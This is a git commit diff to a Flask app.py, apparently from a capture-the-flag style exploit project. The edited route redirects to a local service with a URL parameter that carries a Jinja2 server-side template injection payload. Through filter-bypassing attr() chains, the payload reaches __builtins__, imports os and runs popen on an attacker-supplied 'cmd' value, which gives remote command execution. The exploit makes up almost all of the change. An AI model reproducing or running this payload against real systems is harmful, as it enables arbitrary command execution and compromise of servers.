387f9851370f70e38665aa7cd3ada17a8e97f44f
sup3ruserdo <Aleksandrastrelchuk62@gmail.com>
2024-10-23 21:39:18 +0300

    Update app.py

--- app.py
+++ app.py
@@ -8,5 +8,4 @@ def catch(path):
         resp = Response("")
         resp.headers['Content-Type'] = 'text/x-component'
         return resp
-    return redirect("http://0.0.0.0:3000/home?token=f758a3bbb81184b37b8fba12335d43b0&directory={%with output=((((request|attr('application'))|attr(request|attr(\"args\")|attr(\"get\")('globals')))|attr(request|attr(\"args\")|attr("get")('getitem')))(request|attr(\"args\")|attr(\"get\")('builtins'))|attr(request|attr(\"args\")|attr(\"get\")('getitem')))(request|attr(\"args\")|attr(\"get\")('import'))('os')|attr('popen')(request|attr(\"args\")|attr(\"get\")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=
-)
+    return redirect("http://0.0.0.0:3000/home?token=f758a3bbb81184b37b8fba12335d43b0&directory={%with output=((((request|attr('application'))|attr(request|attr(\"args\")|attr(\"get\")('globals')))|attr(request|attr(\"args\")|attr(\"get\")('getitem')))(request|attr(\"args\")|attr(\"get\")('builtins'))|attr(request|attr(\"args\")|attr(\"get\")('getitem')))(request|attr(\"args\")|attr(\"get\")('import'))('os')|attr('popen')(request|attr(\"args\")|attr(\"get\")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=")
